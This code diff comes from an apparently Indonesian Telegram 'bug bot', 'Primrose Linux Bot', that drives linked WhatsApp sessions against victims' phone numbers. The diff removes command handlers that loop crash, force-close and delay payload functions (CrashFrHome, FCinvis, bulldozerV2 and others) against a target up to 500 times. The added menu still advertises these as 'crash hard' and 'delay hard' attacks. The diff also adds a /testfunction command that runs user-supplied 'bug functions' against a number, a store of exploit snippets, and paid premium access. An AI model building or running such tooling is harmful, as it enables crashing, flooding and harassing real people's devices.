-    let response = `<blockquote>📋 DAFTAR CELAH (${celahDatabase.length})</blockquote>\n\n`;
-    for (let i = 0; i < Math.min(celahDatabase.length, 15); i++) response += `<b>${i+1}. ${celahDatabase[i].type}</b>\n<code>${celahDatabase[i].id}</code>\n\n`;
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "listcelah");
+    if (!hasAccess) return;
+    if (celahDatabase.length === 0) {
+        return safeSendMessage(chatId, "📌 *Belum ada celah tersimpan di database.*\n\nGunakan /addcelah untuk menambahkan.", { parse_mode: "Markdown" });
+    }
+    let response = `<blockquote>📋 DAFTAR CELAH TERSIMPAN</blockquote>\n\n`;
+    response += `Total: ${celahDatabase.length} celah\n━━━━━━━━━━━━━━━━━━\n\n`;
+    for (let i = 0; i < Math.min(celahDatabase.length, 15); i++) {
+        const celah = celahDatabase[i];
+        response += `<b>${i+1}. ID: ${celah.id}</b>\n`;
+        response += `<b>Type:</b> ${celah.type}\n`;
+        response += `<b>Content:</b>\n<code>${celah.content.substring(0, 300)}</code>\n`;
+        if (celah.content.length > 300) response += `...\n`;
+        response += `━━━━━━━━━━━━━━━━━━\n\n`;
+    }
+    if (celahDatabase.length > 15) {
+        response += `\n... dan ${celahDatabase.length - 15} celah lainnya\n`;
+        response += `Gunakan /delcelah <id> untuk menghapus\n`;
+    }
     await safeSendMessage(chatId, response, { parse_mode: "HTML" });
 });
 
+// ================= FITUR DEL CELAH ================= //
 bot.onText(/\/delcelah (\w+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "delcelah")) return;
-    const index = celahDatabase.findIndex(c => c.id === match[1]);
-    if (index === -1) return safeSendMessage(chatId, "❌ ID tidak ditemukan.");
-    celahDatabase.splice(index, 1);
-    saveCelahDatabase();
-    await safeSendMessage(chatId, "✅ Celah dihapus.");
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "delcelah");
+    if (!hasAccess) return;
+    const id = match[1];
+    const index = celahDatabase.findIndex(c => c.id === id);
+    if (index === -1) {
+        return safeSendMessage(chatId, `❌ Celah dengan ID ${id} tidak ditemukan.`);
+    }
+    const removed = celahDatabase.splice(index, 1)[0];
+    saveCelahDatabase(celahDatabase);
+    await safeSendMessage(chatId, `✅ *Berhasil menghapus celah!*\n\nType: ${removed.type}\nID: ${removed.id}`, { parse_mode: "Markdown" });
 });
 
+// ================= FITUR TESTFUNCTION ================= //
 bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "testfunction")) return;
-    if (!msg.reply_to_message || !msg.reply_to_message.text) return safeSendMessage(chatId, "⚠️ Reply function JavaScript.");
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "testfunction");
+    if (!hasAccess) return;
+    if (!msg.reply_to_message || !msg.reply_to_message.text) {
+        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Reply function JavaScript\n2. Ketik /testfunction <nomor> <jumlah>", { parse_mode: "Markdown" });
+    }
     const args = msg.text.split(" ");
-    if (args.length < 3) return safeSendMessage(chatId, "🪧 Example : /testfunction 62xxx 10");
-    const targetNumber = args[1].replace(/[^0-9]/g, "");
-    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
-    if (isNaN(jumlah) || jumlah <= 0) return safeSendMessage(chatId, "❌ Jumlah harus angka");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    const loadingMsg = await safeSendMessage(chatId, "🚀 Memproses testfunction...");
+    if (args.length < 3) {
+        return safeSendMessage(chatId, "🪧 Example : /testfunction 62xxx 10 (reply function)");
+    }
+    const q = args[1];
+    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
+    if (isNaN(jumlah) || jumlah <= 0) {
+        return safeSendMessage(chatId, "❌ Jumlah harus angka");
+    }
+    const targetNumber = q.replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    if (sessions.size === 0) {
+        return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    }
+    const activeSocket = await getActiveSocket();
+    if (!activeSocket) {
+        return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif.");
+    }
+    const sock = activeSocket.sock;
+    const funcCode = msg.reply_to_message.text;
+    const loadingMsg = await safeSendMessage(chatId, "🚀 *Memproses testfunction...*", { parse_mode: "Markdown" });
     if (!loadingMsg) return;
-    const success = await executeTestFunction(sock, `${targetNumber}@s.whatsapp.net`, msg.reply_to_message.text, jumlah);
-    await safeEditMessageText(chatId, loadingMsg.message_id, success ? `✅ Testfunction selesai!\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x` : `❌ Testfunction gagal!`);
+    const success = await executeTestFunction(sock, target, funcCode, jumlah);
+    if (success) {
+        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *Testfunction selesai!*\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x\nStatus: Success\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
+    } else {
+        await safeEditMessageText(chatId, loadingMsg.message_id, `❌ *Testfunction gagal!*\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x\nStatus: Failed\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
+    }
 });
 
-// ================= BUG COMMANDS ================= //
-bot.onText(/\/XspamForce(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "xspamforce")) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /XspamForce 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "XspamForce", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 500; i++) { await CrashFrHome(sock, `${targetNumber}@s.whatsapp.net`); await StickerFC(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
-});
+// ================= FITUR PREMIUM & ADMIN ================= //
 
-bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "xploit")) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /xploit 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    await FCinvis(sock, `${targetNumber}@s.whatsapp.net`);
-});
-
-bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "sanjiva")) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 10; i++) { await xatanicaldelayv2(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
-});
-
-bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "stova")) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Stova 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 7; i++) { await brem(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
-});
-
-bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "chatms")) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Chatms 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 500; i++) { await FCinvisTes(sock, `${targetNumber}@s.whatsapp.net`); await sleep(3000); }
-});
-
-bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "ganesha")) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 10; i++) { await bulldozerV2(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
-});
-
-bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "sendbug")) return;
-    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /sendbug 628xxx");
-    const targetNumber = match[1].replace(/[^0-9]/g, "");
-    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
-    const sock = sessions.values().next().value;
-    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", getCurrentDate()), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
-    for (let i = 0; i < 35; i++) { await VisiFriend(sock, `${targetNumber}@s.whatsapp.net`); await sleep(100); }
-});
-
-// ================= OWNER/ADMIN COMMANDS ================= //
 const pendingPremiumPoll = {};
-const pendingColorPoll = {};
 
 bot.onText(/\/addprem\s+(\d+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
     const targetUserId = parseInt(match[1]);
-    if (premiumUsers.find(u => u.id === targetUserId)) return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah premium.`);
-    const poll = await bot.sendPoll(chatId, "💎 PILIH DURASI PREMIUM", ["💎 7 Hari", "👑 14 Hari", "🚀 30 Hari", "♾️ Permanent"], { is_anonymous: false });
-    pendingPremiumPoll[poll.poll.id] = { userId: targetUserId, adminId: userId, chatId };
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const existing = premiumUsers.find(u => u.id === targetUserId);
+    if (existing) {
+        return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi premium user.`);
+    }
+    const options = ["💎 7 Hari", "👑 14 Hari", "🚀 30 Hari", "♾️ Permanent"];
+    const poll = await bot.sendPoll(chatId, "💎 PILIH DURASI PREMIUM", options, { is_anonymous: false });
+    pendingPremiumPoll[poll.poll.id] = {
+        userId: targetUserId,
+        adminId: userId,
+        chatId: chatId
+    };
 });
 
 bot.onText(/\/delprem\s+(\d+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
-    const index = premiumUsers.findIndex(u => u.id === parseInt(match[1]));
-    if (index === -1) return safeSendMessage(chatId, "❌ User tidak ditemukan.");
+    const targetUserId = parseInt(match[1]);
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    const index = premiumUsers.findIndex(u => u.id === targetUserId);
+    if (index === -1) {
+        return safeSendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar premium.`);
+    }
     premiumUsers.splice(index, 1);
     savePremiumUsers();
-    safeSendMessage(chatId, "✅ User dihapus dari premium.");
+    safeSendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar premium.`);
 });
 
 bot.onText(/\/addadmin\s+(\d+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
     const targetUserId = parseInt(match[1]);
-    if (adminUsers.includes(targetUserId)) return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah admin.`);
+    if (!isOwner(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.");
+    }
+    if (adminUsers.includes(targetUserId)) {
+        return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi admin.`);
+    }
     adminUsers.push(targetUserId);
     saveAdminUsers();
-    safeSendMessage(chatId, "✅ Admin ditambahkan.");
+    safeSendMessage(chatId, `✅ User ${targetUserId} berhasil ditambahkan sebagai admin.`);
 });
 
 bot.onText(/\/deladmin\s+(\d+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
-    const index = adminUsers.indexOf(parseInt(match[1]));
-    if (index === -1) return safeSendMessage(chatId, "❌ Admin tidak ditemukan.");
+    const targetUserId = parseInt(match[1]);
+    if (!isOwner(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.");
+    }
+    const index = adminUsers.indexOf(targetUserId);
+    if (index === -1) {
+        return safeSendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar admin.`);
+    }
     adminUsers.splice(index, 1);
     saveAdminUsers();
-    safeSendMessage(chatId, "✅ Admin dihapus.");
+    safeSendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar admin.`);
 });
 
 bot.onText(/\/listprem/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
-    if (premiumUsers.length === 0) return safeSendMessage(chatId, "📌 Belum ada premium user.");
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    if (premiumUsers.length === 0) {
+        return safeSendMessage(chatId, "📌 Belum ada premium user.");
+    }
     let message = `<blockquote>📋 Daftar Premium User</blockquote>\n\n`;
-    premiumUsers.forEach((user, i) => message += `${i+1}. ID: ${user.id}\n   Expires: ${user.expiresAt === "permanent" ? "Permanent" : moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss')}\n\n`);
+    premiumUsers.forEach((user, index) => {
+        const expires = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
+        message += `${index + 1}. ID: <code>${user.id}</code>\n   Expires: ${expires}\n\n`;
+    });
     safeSendMessage(chatId, message, { parse_mode: "HTML" });
 });
 
 bot.onText(/\/listadmin/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    if (!isOwner(userId) && !adminUsers.includes(userId)) return safeSendMessage(chatId, "❌ Akses ditolak!");
-    if (adminUsers.length === 0) return safeSendMessage(chatId, "📌 Belum ada admin.");
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    if (adminUsers.length === 0) {
+        return safeSendMessage(chatId, "📌 Belum ada admin.");
+    }
     let message = `<blockquote>📋 Daftar Admin</blockquote>\n\n`;
-    adminUsers.forEach((admin, i) => message += `${i+1}. ID: ${admin}\n\n`);
+    adminUsers.forEach((admin, index) => {
+        message += `${index + 1}. ID: <code>${admin}</code>\n\n`;
+    });
     safeSendMessage(chatId, message, { parse_mode: "HTML" });
+});
+
+bot.on("poll_answer", async (answer) => {
+    // Handle premium poll
+    const pollData = pendingPremiumPoll[answer.poll_id];
+    if (pollData) {
+        if (answer.user.id !== pollData.adminId) return;
+        const choice = answer.option_ids[0];
+        let days;
+        if (choice === 0) days = 7;
+        if (choice === 1) days = 14;
+        if (choice === 2) days = 30;
+        if (choice === 3) days = "permanent";
+        let expiresAt;
+        if (days === "permanent") {
+            expiresAt = "permanent";
+        } else {
+            expiresAt = Date.now() + days * 86400000;
+        }
+        const existing = premiumUsers.find(u => u.id === pollData.userId);
+        if (!existing) {
+            premiumUsers.push({ id: pollData.userId, expiresAt });
+        } else {
+            existing.expiresAt = expiresAt;
+        }
+        savePremiumUsers();
+        safeSendMessage(pollData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${pollData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
+        delete pendingPremiumPoll[answer.poll_id];
+        return;
+    }
+    
+    // Handle color poll
+    const colorPollData = pendingColorPoll[answer.poll_id];
+    if (colorPollData) {
+        const selectedOption = answer.option_ids[0];
+        let selectedColor = "";
+        if (selectedOption === 0) selectedColor = "XRED";
+        else if (selectedOption === 1) selectedColor = "XBLUE";
+        else if (selectedOption === 2) selectedColor = "XGREEN";
+        else if (selectedOption === 3) selectedColor = "XWHITE";
+        else if (selectedOption === 4) selectedColor = "XDISCO";
+        const colorValue = getColorFromChoice(selectedColor);
+        saveColorSetting(colorValue);
+        currentColor = colorValue;
+        if (buttonIntervals.has(colorPollData.currentMessageId)) {
+            clearInterval(buttonIntervals.get(colorPollData.currentMessageId));
+            buttonIntervals.delete(colorPollData.currentMessageId);
+        }
+        if (globalIntervalId) {
+            clearInterval(globalIntervalId);
+            globalIntervalId = null;
+        }
+        discoActive = false;
+        await sendColoredMenu(colorPollData.chatId, colorPollData.from, colorValue, colorPollData.currentMessageId);
+        delete pendingColorPoll[answer.poll_id];
+        return;
+    }
+});
+
+// ================= CALLBACK QUERY HANDLER ================= //
+bot.on("callback_query", async (query) => {
+    if (!query.message) return;
+    const chatId = query.message.chat.id;
+    const currentMessageId = query.message.message_id;
+    const data = query.data;
+    const userId = query.from.id;
+
+    if (data && data.startsWith("autofix_")) {
+        const originalMsgId = parseInt(data.replace("autofix_", ""));
+        const pendingData = global.pendingFix ? global.pendingFix[originalMsgId] : null;
+        if (!pendingData) {
+            await bot.answerCallbackQuery(query.id, { text: "❌ Data tidak ditemukan, coba ulangi /cekfunc" }).catch(() => {});
+            return;
+        }
+        await bot.answerCallbackQuery(query.id, { text: "🔧 Memperbaiki code 100% akurat..." }).catch(() => {});
+        const fixResult = autoFixJavaScript(pendingData.code, pendingData.error);
+        let resultText = `✅ *CODE DIPERBAIKI 100%!*\n\n`;
+        resultText += `📊 *${fixResult.fixes.length} perbaikan:*\n`;
+        fixResult.fixes.slice(0, 10).forEach(f => resultText += `• ${f}\n`);
+        resultText += `\n🟢 *HASIL AKHIR:*\n\`\`\`javascript\n${fixResult.fixed.substring(0, 2000)}\n\`\`\``;
+        if (fixResult.fixed.length > 2000) {
+            resultText += `\n\n📁 Code panjang, dikirim sebagai file...`;
+            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
+            const filePath = `fixed_${Date.now()}.js`;
+            fs.writeFileSync(filePath, fixResult.fixed);
+            await bot.sendDocument(chatId, filePath, { caption: `✅ Fixed code - ${fixResult.fixes.length} issues fixed` });
+            fs.unlinkSync(filePath);
+        } else {
+            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
+        }
+        delete global.pendingFix[originalMsgId];
+        await bot.answerCallbackQuery(query.id).catch(() => {});
+        return;
+    }
+
+    if (buttonIntervals.has(currentMessageId)) {
+        clearInterval(buttonIntervals.get(currentMessageId));
+        buttonIntervals.delete(currentMessageId);
+    }
+    if (globalIntervalId) {
+        clearInterval(globalIntervalId);
+        globalIntervalId = null;
+    }
+    discoActive = false;
+
+    let caption = "";
+    let replyMarkup = {};
+    let selectedImage = getRandomImage();
+
+    if (data === "trashmenu") {
+        caption = `<blockquote>─━━─━━⧼ BUG MENU ⧽─━━─━━</blockquote>
+<b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟    
+😄 Owner : @realmarz 🌟
+🍽 Version : ${CURRENT_VERSION}
+🗡 Platform : Telegram
+<b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>
+─▢ /sendbug +628
+─▢ /clear +628
+<b>╰➤ hapus bug</b>
+<b>─━━─━━⧼ BUG MENU ⧽─━━─━━:</b>
+# Primrose Linux Bot 𖣂
+─▢ /Xploit 
+<b>╰➤ blank hard</b>
+─▢ /Sanjiva
+<b>╰➤ delay hard murbug</b>
+─▢ /Stova 
+<b>╰➤ new delay brutality murbug</b>
+─▢ /Chatms +628
+<b>╰➤ crash hard</b>
+─▢ /Ganesha +628
+<b>╰➤ Buldo hard</b>
+─▢ /XspamForce +628
+<b>╰➤ spam force anti kenok (2 function combo)</b>
+<pre>──────────────────────────
+   MENU: Pilih Fitur Bug Menu di Atas 
+──────────────────────────</pre>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "owner_menu") {
+        caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟    
+😄 Owner : @realmarz 🌟
+🍽 Version : ${CURRENT_VERSION}
+🗡 Platform : Telegram     
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃      ▢ /addprem &lt;id&gt;
+┃      ╰➤ Menambahkan akses premium pada user
+┃      ▢ /delprem &lt;id&gt;
+┃      ╰➤ Menghapus akses premium pada user
+┃      ▢ /addadmin &lt;id&gt;
+┃      ╰➤ Menambahkan akses admin pada user
+┃      ▢ /deladmin &lt;id&gt;
+┃      ╰➤ Menghapus akses admin pada user
+┃      ▢ /listprem
+┃      ╰➤ Melihat list premium user yang ada
+┃      ▢ /listadmin
+┃      ╰➤ Melihat list admin
+┃      ▢ /reqpair ☇ Number
+┃      ╰➤ Menambah Sender WhatsApp
+┃      ▢ /update on/off
+┃      ╰➤ Mengaktifkan/menonaktifkan auto update
+┃      ▢ /autoupdate
+┃      ╰➤ Update manual dari GitHub
+┃      ▢ /checkupdate
+┃      ╰➤ Cek versi terbaru
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<blockquote><b>NOTE:</b>
+Baca dengan teliti Jangan asal ngetik untuk mendapatkan akses</blockquote>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "group_security_menu") {
+        caption = `<blockquote><b>🔒 XGROUPSECURITY MENU 🔒</b></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃      ▢ /blokcmd &lt;command&gt;
+┃      ╰➤ Mem-block command bug
+┃      ▢ /bukacmd &lt;command&gt;
+┃      ╰➤ Membuka block command bug
+┃      ▢ /addpremgrup &lt;hari&gt;
+┃      ╰➤ Menambah grup ke premium (gunakan di grup)
+┃      ▢ /delpremgrup
+┃      ╰➤ Menghapus grup dari premium
+┃      ▢ /listpremgrub
+┃      ╰➤ Menampilkan member premium dalam grup
+┃      ▢ /add (ketik "add" di grup premium)
+┃      ╰➤ Menambah diri sebagai premium user
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<blockquote><b>NOTE:</b>
+Command hanya bisa digunakan oleh admin grup</blockquote>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "toolsbug_menu") {
+        caption = `<blockquote><b>🛠️ XTOOLSBUG MENU 🛠️</b></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃      ▢ /testfunction &lt;number&gt; &lt;jumlah&gt;
+┃      ╰➤ Reply dengan function bug
+┃      ▢ /celahfunc &lt;reply func atau file&gt;
+┃      ╰➤ Extract celah dari function
+┃      ▢ /addcelah &lt;reply func atau file&gt;
+┃      ╰➤ Menyimpan celah ke database
+┃      ▢ /listcelah
+┃      ╰➤ Menampilkan semua celah tersimpan
+┃      ▢ /delcelah &lt;id&gt;
+┃      ╰➤ Menghapus celah dari database
+┃      ▢ /cekfunc &lt;reply func&gt;
+┃      ╰➤ Cek error function + auto fix 100%
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<blockquote><b>NOTE:</b>
+Gunakan tools ini untuk testing dan debugging</blockquote>`
+        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
+    } else if (data === "change_color_menu") {
+        const options = ["🔴 XRED", "🔵 XBLUE", "🟢 XGREEN", "⚪ XWHITE", "🌈 XDISCO"]
+        const poll = await bot.sendPoll(chatId, "🎨 PILIH WARNA BUTTON", options, { is_anonymous: false, allows_multiple_answers: false })
+        pendingColorPoll[poll.poll.id] = { chatId: chatId, userId: userId, from: query.from, currentMessageId: currentMessageId }
+        return await bot.answerCallbackQuery(query.id).catch(() => {});
+    } else if (data === "back_to_main") {
+        const runtimeStatus = formatRuntime()
+        const memoryStatus = formatMemory()
+        const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
+        const botNumber = sessions.size
+        const isWhite = (currentColor === "secondary")
+        const buttonStyle = isWhite ? undefined : (currentColor === "disco" ? buttonStyles[0] : currentColor)
+        let keyboard = [
+            [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
+            [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
+            [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
+        ]
+        if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''))
+        const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
+🎩 Pemilik : @ItsMeXanderRzMd 🌟    
+😄 Owner : @realmarz 🌟
+🍽 Version : ${CURRENT_VERSION} 
+🗡 Platform : Telegram
+<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
+⛧ Status : ${status}
+⛧ Number : ${botNumber}
+⛧ Runtime : ${runtimeStatus}
+⛧ Memory : ${memoryStatus}`
+        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: getRandomImage(), caption: caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } })
+        if (currentColor === "disco") {
+            if (buttonIntervals.has(currentMessageId)) {
+                clearInterval(buttonIntervals.get(currentMessageId))
+                buttonIntervals.delete(currentMessageId)
+            }
+            if (globalIntervalId) clearInterval(globalIntervalId)
+            discoActive = true
+            let index = 0
+            globalIntervalId = setInterval(async () => {
+                if (!discoActive) return
+                index = (index + 1) % buttonStyles.length
+                const newStyle = buttonStyles[index]
+                let newKeyboard = [
+                    [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
+                    [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
+                    [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
+                ]
+                await safeEditMessageReplyMarkup(chatId, currentMessageId, { inline_keyboard: newKeyboard });
+            }, 1500)
+            buttonIntervals.set(currentMessageId, globalIntervalId)
+        }
+        return await bot.answerCallbackQuery(query.id).catch(() => {});
+    }
+
+    if (caption !== "") {
+        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: selectedImage, caption: caption, parse_mode: "HTML" }, { reply_markup: replyMarkup });
+    }
